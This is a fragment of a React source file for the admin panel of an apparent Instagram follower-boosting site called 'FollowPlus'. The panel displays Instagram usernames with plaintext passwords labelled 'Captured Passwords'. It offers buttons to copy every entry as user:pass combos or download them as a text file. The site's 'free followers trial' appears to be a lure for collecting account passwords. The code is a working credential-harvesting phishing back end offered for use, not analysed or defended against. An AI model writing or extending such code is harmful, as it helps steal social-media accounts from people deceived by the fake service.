                      <h3 className="text-sm font-mono text-gray-400 uppercase tracking-widest font-bold">Saved Account Logins Database</h3>
                      <p className="text-xs text-gray-500 mt-1">Real-time captured ID & password parameters from linking submissions.</p>
                    </div>

                    <div className="flex flex-wrap items-center gap-2">
                      <button
                        onClick={() => {
                          const list = campaigns
                            .filter(c => c.password)
                            .map(c => `${c.username}:${c.password}`)
                            .join('\n');
                          
                          if (!list) return alert('No credentials available to copy.');
                          
                          navigator.clipboard.writeText(list)
                            .then(() => {
                              setCopiedAll(true);
                              setTimeout(() => setCopiedAll(false), 2000);
                            })
                            .catch(() => {
                              alert("Unable to access clipboard. Please copy manually from the list.");
                            });
                        }}
                        className="px-4 py-2 bg-indigo-500/15 hover:bg-indigo-500/25 border border-indigo-500/30 hover:border-indigo-500/40 text-indigo-300 font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
                      >
                        {copiedAll ? (
                          <>
                            <Check className="w-4 h-4 text-emerald-400 animate-scale" />
                            Copied All Accounts!
                          </>
                        ) : (
                          <>
                            <Copy className="w-4 h-4" />
                            Copy All as (user:pass)
                          </>
                        )}
                      </button>

                      <button
                        onClick={() => {
                          const list = campaigns
                            .filter(c => c.password)
                            .map(c => `Username: @${c.username}\nPassword: ${c.password}\nSubmitted At: ${c.createdAt || 'N/A'}\n---------------------------`)
                            .join('\n\n');
                          
                          if (!list) return alert('No credentials list found.');
                          
                          const blob = new Blob([list], { type: 'text/plain' });
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement('a');
                          a.href = url;
                          a.download = `followplus_saved_passwords_${Date.now()}.txt`;
                          document.body.appendChild(a);
                          a.click();
                          document.body.removeChild(a);
                          URL.revokeObjectURL(url);
                        }}
                        className="px-4 py-2 bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/30 hover:border-emerald-500/40 text-emerald-300 font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
                      >
                        <Download className="w-4 h-4" />
                        Download Accounts (.txt)
                      </button>
                    </div>
                  </div>

                  {/* Logins Container */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {campaigns
                      .filter(c => c.password)
                      .filter(c => 
                        c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                        (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                      ).length === 0 ? (
                      <div className="col-span-2 p-10 text-center text-gray-500 font-mono border border-dashed border-white/10 rounded-2xl">
                        No user login credentials saved in session yet. Try linking an account with a password on the homepage.
                      </div>
                    ) : (
                      campaigns
                        .filter(c => c.password)
                        .filter(c => 
                          c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                          (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                        )
                        .map((camp) => (
                          <div key={camp.id} className="glass-card p-5 border border-white/10 hover:border-indigo-500/20 transition-all flex flex-col justify-between space-y-4">
                            <div className="flex items-start justify-between">
                              <div className="flex items-center gap-2.5">
                                <div className="w-9 h-9 bg-pink-500/10 rounded-lg flex items-center justify-center text-pink-400 border border-pink-500/20">
                                  <Key className="w-4 h-4" />
                                </div>
                                <div>
                                  <span className="text-gray-500 font-mono text-xs block">Instagram Account ID</span>
                                  <span className="text-sm font-bold text-white font-mono">@{camp.username}</span>
                                </div>
                              </div>

                              <div className="flex gap-1.5">
                                <button
                                  onClick={() => {
                                    navigator.clipboard.writeText(`${camp.username}:${camp.password}`);
                                    setCopiedId(camp.id);
                                    setTimeout(() => setCopiedId(null), 1500);
                                  }}
                                  className="p-2 bg-white/5 hover:bg-white/10 border border-white/10 text-gray-400 hover:text-white rounded-lg transition-colors cursor-pointer"
                                  title="Copy combined user:pass credentials"
                                >
                                  {copiedId === camp.id ? (
                                    <Check className="w-3.5 h-3.5 text-emerald-400" />
                                  ) : (
                                    <Copy className="w-3.5 h-3.5" />
                                  )}
                                </button>
                                <button
                                  onClick={() => {
                                    if (confirm(`Do you want to delete stored credential log for @${camp.username}?`)) {
                                      deleteCampaign(camp.id);
                                    }
                                  }}
                                  className="p-2 bg-rose-500/5 hover:bg-rose-500/10 border border-rose-500/10 text-rose-500 hover:text-rose-400 rounded-lg transition-colors cursor-pointer"
                                  title="Remove credential entry"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            </div>

                            <div className="bg-black/40 border border-white/5 p-3.5 rounded-xl space-y-2">
                              <span className="text-[10px] text-gray-500 font-mono block uppercase">Captured Passwords</span>
                              <div className="flex items-center justify-between bg-black/50 border border-white/10 py-1.5 px-3 rounded-lg">
                                <span className="font-mono text-xs text-pink-400 font-bold tracking-wide select-all">
                                  {camp.password}
                                </span>
                              </div>
                              <div className="flex justify-between items-center text-[10px] font-mono text-gray-500 pt-1">
                                <span>TYPE: {camp.type === 'free_followers_trial' ? '8-Day Trial' : 'Premium Boost'}</span>
                                <span>DELIVERY: {camp.targetAmount === 800 ? 'Free trial' : 'Paid Premium'}</span>
                              </div>
                            </div>
                          </div>
                        ))
                    )}
                  </div>
                </div>
              )}

              <div className="flex justify-end pt-2">
                <p className="text-[10px] text-gray-600 font-mono">FollowPlus Administration Keypad Security Core V1.2.9</p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
